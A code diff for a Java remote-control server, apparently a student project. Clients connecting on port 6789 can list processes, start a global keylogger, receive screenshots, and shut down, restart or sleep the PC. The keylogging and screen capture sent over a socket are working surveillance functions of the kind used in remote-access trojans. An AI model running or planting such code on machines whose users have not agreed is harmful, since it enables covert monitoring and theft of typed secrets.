@@ -7,17 +7,16 @@ import java.net.ServerSocket;
 import java.util.Scanner;
 
 import javax.imageio.ImageIO;
-import javax.swing.JOptionPane;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
 
-import model.KeyLog;
-import model.Server;
 import model.*;
 
 public class Main {
+	
 	private static KeyLog keyLog = new KeyLog();
+	
 	public static void main(String[] args) throws IOException {
 		GlobalScreen.setEventDispatcher(new SwingDispatchService());
 		int port = 6789;
@@ -44,12 +43,14 @@ public class Main {
 				else if(msg.equals("LIST_APP")) List("APP");
 				else if(msg.equals("LIST_PROCESS")) List("PROCESS");
 				else if(msg.equals("DISCONNECT")) isRunning = false;
-				else if(msg.equals("CAPTURE")) Capture();
 				else if(msg.equals("HOOK")) Hook();
 				else if(msg.equals("UNHOOK")) Unhook();
 				else if(msg.equals("SHOW TEXT")) Showtext();
+				else if(msg.equals("CAPTURE")) Capture();
 				else if(msg.equals("SHUTDOWN")) Shutdown();
 				else if(msg.equals("RESTART")) Restart();
+				else if(msg.equals("SLEEP")) Sleep();
+				else if(msg.equals("EXIT")) isRunning = false;
 				else isRunning = false;
 				
 			} catch(Exception e1) {
@@ -60,6 +61,7 @@ public class Main {
 		try {
 			Server.server.close();
 			Server.client.close();
+			System.exit(0);
 		} catch (IOException e1) {
 			e1.printStackTrace();
 		}
@@ -103,74 +105,6 @@ public class Main {
 		}
 	}
 	
-	// Capture ===========================================
-//	public static byte[] getScreen()
-//	{
-//	    BufferedImage imagebuf = null;
-//	    try {
-//	        imagebuf = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-//	    } catch (Exception e) {
-//	        System.err.println("Can't get screen.");
-//	        return null;
-//	    }           
-//
-//	    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-//	    byte[] imageInByte;
-//	    try {
-//	        ImageIO.write(imagebuf, "jpg", baos);
-//	        baos.flush();
-//	    } catch (IOException e) {
-//	        e.printStackTrace();
-//	        return null;
-//	    }
-//	    finally {       
-//	        imageInByte = baos.toByteArray();
-//	        try {
-//	            baos.close();
-//	        } catch (IOException e) {
-//	            e.printStackTrace();
-//	        }
-//	    }
-//	    return imageInByte; 
-//	}
-	
-	
-	public static void Capture() {
-		BufferedImage image = null;
-	    try {
-	        image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-	    } catch (Exception e) {
-	        System.err.println("Can't get screen.");
-	    }
-	    try {
-			ImageIO.write(image, "PNG", Server.client.getOutputStream());
-		} catch (IOException e) {
-			System.err.println("Can't send IMG.");
-			e.printStackTrace();
-		}
-	}	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
 	// LIST =======================================================================================
 	private static void List(String type) throws IOException, InterruptedException {
 		Process process;
@@ -196,13 +130,11 @@ public class Main {
 				String ID = info.substring(pFirstSpace + 1, pLastSpace - 1);
 				ID = ID.replaceAll("\\s", "");
 				String count = info.substring(pLastSpace);
-				//System.out.println(name + " " + ID + " " + count);
 				try {
 					Server.out.write(name);
 					Server.out.newLine();
 					Server.out.flush();
 				} catch (IOException e) {
-					e.printStackTrace();
 				}
 				
 				try {
@@ -210,7 +142,6 @@ public class Main {
 					Server.out.newLine();
 					Server.out.flush();
 				} catch (IOException e) {
-					e.printStackTrace();
 				}
 				
 				try {
@@ -218,7 +149,6 @@ public class Main {
 					Server.out.newLine();
 					Server.out.flush();
 				} catch (IOException e) {
-					e.printStackTrace();
 				}
 				
 			}
@@ -247,12 +177,23 @@ public class Main {
 			Server.out.flush();
 			keyLog.keylog = "";
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
 		}		
 	}
 	
-	
+	private static void Capture() {
+		BufferedImage image = null;
+	    try {
+	        image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+	    } catch (Exception e) {
+	        System.err.println("Can't get screen.");
+	    }
+	    try {
+			ImageIO.write(image, "PNG", Server.client.getOutputStream());
+		} catch (IOException e) {
+			System.err.println("Can't send IMG.");
+			e.printStackTrace();
+		}
+	}	
 	
 	private static void Shutdown()
 	{
@@ -270,12 +211,8 @@ public class Main {
 	    }
 	    catch(IOException e)
 	    {
-	       System.out.println("Exception: " +e);
 	    }
 	}
-	
-	
-	
 	
 	
 	private static void Restart() {
@@ -288,12 +225,29 @@ public class Main {
 		}
 	    try
 	    {
-	       System.out.println("Restarting the PC after 20 seconds.");
-	       runtime.exec("shutdown -r -t 20");
+	       System.out.println("Restarting the PC after 10 seconds.");
+	       runtime.exec("shutdown -r -t 10");
 	    }
 	    catch(IOException e)
 	    {
-	       System.out.println("Exception: " +e);
+	    }
+	}
+	
+	private static void Sleep() {
+		Runtime runtime = Runtime.getRuntime() ;
+		try {
+			Server.server.close();
+			Server.client.close();
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}
+	    try
+	    {
+	       System.out.println("Sleep the PC after 10 seconds.");
+	       runtime.exec("Rundll32.exe powrprof.dll, SetSuspendState Sleep");
+	    }
+	    catch(IOException e)
+	    {
 	    }
 	}
 }
